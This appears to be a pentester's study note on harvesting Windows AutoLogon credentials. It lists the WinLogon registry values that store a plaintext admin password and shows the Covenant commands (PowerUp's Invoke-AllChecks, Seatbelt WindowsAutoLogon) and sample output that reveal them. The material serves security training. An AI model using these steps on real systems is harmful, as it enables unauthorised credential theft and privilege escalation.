# AutoLogon

## Target requirements

- The target need to have those values in the registry in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon`
  - AutoAdminLogon set to 1
  - DefaultDomainName with a valid domain set
  - DefaultUserName with a valid admin username
  - DefaultPassword with a valid admin pass  

This basically means that the target when restarted will logon automatically without prompting for username and password.

## Exploitation

- You should have a shell with covenant or metasploit or netcat.  
We will use Covenant here.

### Covenant with PowerUp

- In the shell we will type PowerShellImport, type enter and fetch PoweUp.ps1 (if you do not have it you can get it [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) )  
- Click on execute
- type `powershell invoke-allchecks` in your shell
- Once the command executed it will do all sorts of check and we should see something like this:
```
[*] Checking for Autologon credentials in registry...

DefaultDomainName    : domain
DefaultUserName      : f.lastanme
DefaultPassword      : password
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 

```

### Covenant with Seatbelt

- Check for it with `Seatbelt WindowsAutoLogon`

```
====== WindowsAutoLogon ======

  DefaultDomainName              : domain
  DefaultUserName                : f.lastanme
  DefaultPassword                : password
  AltDefaultDomainName           : 
  AltDefaultUserName             : 
  AltDefaultPassword             : 
```

## Resources

- [TCM security Academy -  Movement pivoting and persistence for pentesters and ethical hacker](https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers)
